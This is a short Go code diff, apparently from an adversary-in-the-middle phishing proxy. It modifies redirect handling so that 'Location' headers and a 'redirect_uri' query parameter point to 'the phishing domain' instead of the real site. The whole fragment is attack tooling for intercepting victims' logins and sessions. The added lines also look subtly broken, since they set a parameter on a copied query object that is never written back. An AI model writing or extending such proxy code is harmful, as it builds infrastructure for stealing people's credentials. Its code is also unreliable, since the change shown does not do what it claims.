@@ -500,8 +500,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
 			if err == nil {
+
 				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
 					r_url.Host = r_host
+					if r_url.Query().Get("redirect_uri") != "" {
+						ruri, _ := p.replaceHostWithPhished(r_url.Query().Get("redirect_uri"))
+						r_url.Query().Set("redirect_uri", ruri)
+					}
 					resp.Header.Set("Location", r_url.String())
 				}
 			}
